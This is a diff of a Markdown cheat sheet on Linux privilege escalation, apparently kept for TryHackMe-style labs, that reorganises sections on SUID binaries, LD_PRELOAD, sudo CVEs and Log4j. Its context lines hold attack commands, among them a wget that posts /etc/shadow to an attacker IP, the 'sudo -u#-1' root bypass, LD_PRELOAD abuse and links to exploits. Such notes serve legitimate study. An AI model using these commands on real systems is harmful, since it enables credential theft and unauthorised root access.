@@ -1,6 +1,6 @@
 **1. Basics**
-**2. LD_PRELOAD && CVE's**
-**3. **
+**2. SUIDS, LD_PRELOAD, && CVE's**
+**3. Log4j**
 **4. References**
 
 ---
@@ -21,7 +21,10 @@
 + sudo apache -f /etc/shadow
 + sudo wget --post-file=/etc/shadow <attacker-ip>:8081 #Send the shadow file to self
 ---
-##**CVE's && LD_PRELOAD::**##
+
+##**2. SUIDS, LD_PRELOAD, && CVE's**##
+
+**CVE's && LD_PRELOAD::**
 + Privesc with LD_PRELOAD=
   + `sudo -l :: env_reset, env_keep+=LD_PRELOAD`
   + ***run malicious library before any other***
@@ -46,21 +49,21 @@ dirsearch - similar to gobuster/dirbuster
 
 brute_forcing with CMS made simple: see ![brute_force_cms_script](screenshots/CMS_made_simple_brute_force.png) && "fun_brute_force_script"
 
-##**CVE-2019-14287::**##
+**CVE-2019-14287::**
 `sudo -l :: hacker ALL=(ALL,!root) /bin/bash`
 `# sudo -u#-1 /bin/bash`
 # https://tryhackme.com/room/sudovulnsbypass
 # Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502
 
 
-##**CVE-2019-18634::**##
+**CVE-2019-18634::**
 `cat /etc/sudoers :: Defaults env_rest,pwfeedback`
 `# sudo -V :: 1.8.21p2 && file grammar V 46`
 `./exploit #C program` See ![cve](screenshots/cve_2019_18634.png)
 # https://tryhackme.com/room/sudovulnsbof
 # Exploit CVE-2019-18634 - https://github.com/saleemrashid/sudo-cve-2019-18634
 
-##**CVE-2021-3156 Baron Samedit::**##
+**CVE-2021-3156 Baron Samedit::**
 ```
 Affects any unpatched sudo 1.8.2-1.8.31p2-1.9.0-1.9.5p1
 This time the vulnerability is a heap buffer overflow, as opposed to the stack buffer (CVE-2019-18634)
@@ -79,11 +82,14 @@ make
 
 ##**SUID - Shared Object Injection::**##
 `find / -type f -perm -04000 -ls 2>/dev/null`
+TODO:: Escalation via shared object injection
 
+---
 
+##**3. Log4j**##
 
 ##**CVE-2021-44228 log4j::**##
-
+TODO:: 
 # [](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java)
 # [](https://log4shell.huntress.com/)
 # [](https://www.youtube.com/watch?v=7qoPDq41xhQ)
